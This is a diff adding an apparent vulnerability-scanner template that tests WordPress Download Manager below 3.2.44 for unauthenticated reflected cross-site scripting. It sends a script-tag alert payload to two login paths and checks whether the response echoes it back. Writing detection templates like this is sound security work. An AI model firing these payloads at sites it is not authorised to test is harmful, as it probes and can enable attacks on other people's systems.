@@ -1,0 +1,29 @@
+id: XSS-download-manager-unauth-3
+
+info:
+  name: Download Manager < 3.2.44 - Unauthenticated Reflected Cross-Site Scripting
+  author: osamahamad
+  severity: critical
+  description: https://wpscan.com/vulnerability/95deb79c-bf19-4ab5-aac6-702a13323356
+  tags: config,exposure
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/wpdm-login/?a"><script>alert(/XSS/)</script>'
+      - '{{BaseURL}}/wp-login/?a"><script>alert(/XSS/)</script>'
+
+
+    redirects: true 
+    max-redirects: 4
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"><script>alert(/XSS/)</script>'
+        part: body
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
